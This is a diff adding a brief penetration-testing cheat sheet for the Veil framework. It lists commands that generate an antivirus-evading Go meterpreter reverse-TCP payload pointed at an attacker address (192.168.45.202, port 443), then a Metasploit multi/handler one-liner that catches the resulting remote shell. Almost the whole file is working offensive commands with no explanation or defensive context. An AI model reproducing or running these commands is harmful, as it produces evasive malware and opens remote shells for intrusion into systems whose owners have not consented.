@@ -1,0 +1,35 @@
+### veil framework ###
+## links
+https://github.com/Veil-Framework/Veil
+
+
+
+#############
+## example ##
+#############
+# auto
+veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
+veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
+
+# manual
+veil
+> use 1									# use evasion tool
+> list									# list payloads
+> use 22								# use payloads
+> set LHOST 192.168.45.202					
+> set LPORT 443
+> generate								# generate rshell
+
+msfconsole -x "use exploit/multi/handler;
+        set payload windows/meterpreter/reverse_tcp;
+        set LHOST 192.168.45.202;
+        set LPORT 443;run;"
+
+
+
+
+
+
+
+
+
